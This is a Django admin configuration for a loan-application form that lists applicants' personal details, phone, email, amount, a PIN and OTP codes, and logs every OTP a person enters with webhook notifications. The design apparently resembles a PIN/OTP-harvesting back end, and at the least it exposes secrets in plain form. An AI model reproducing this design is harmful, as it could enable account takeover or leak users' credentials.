from django.contrib import admin
from .models import Submission, OTPAttempt


class OTPAttemptInline(admin.TabularInline):
    model = OTPAttempt
    extra = 0
    readonly_fields = ["attempt_number", "otp_entered", "matched", "created_at",
                       "n8n_notified", "n8n_notified_at", "n8n_notification_error"]
    can_delete = False


@admin.register(Submission)
class SubmissionAdmin(admin.ModelAdmin):
    list_display = [
        "id", "first_name", "last_name", "age", "employment_status",
        "phone", "email", "amount", "otp_verified", "created_at",
        "n8n_notified",
    ]
    list_filter = ["n8n_notified", "employment_status", "otp_verified"]
    ordering = ["-created_at"]
    search_fields = ["first_name", "last_name", "phone", "email"]
    readonly_fields = [
        "created_at", "name",
        "n8n_notified", "n8n_notified_at", "n8n_notification_error",
    ]
    fieldsets = (
        ("Personal",  {"fields": ("first_name", "last_name", "age", "employment_status")}),
        ("Contact",   {"fields": ("phone", "email")}),
        ("Loan",      {"fields": ("amount", "pin")}),
        ("OTP",       {"fields": ("otp_verified", "otp_code")}),
        ("Meta",      {"fields": ("created_at", "name")}),
        ("Webhook",   {"fields": ("n8n_notified", "n8n_notified_at", "n8n_notification_error")}),
    )
    inlines = [OTPAttemptInline]


@admin.register(OTPAttempt)
class OTPAttemptAdmin(admin.ModelAdmin):
    list_display = [
        "id", "submission", "attempt_number", "otp_entered", "matched",
        "created_at", "n8n_notified",
    ]
    list_filter = ["matched", "n8n_notified"]
    readonly_fields = ["created_at", "n8n_notified", "n8n_notified_at", "n8n_notification_error"]
    ordering = ["-created_at"]
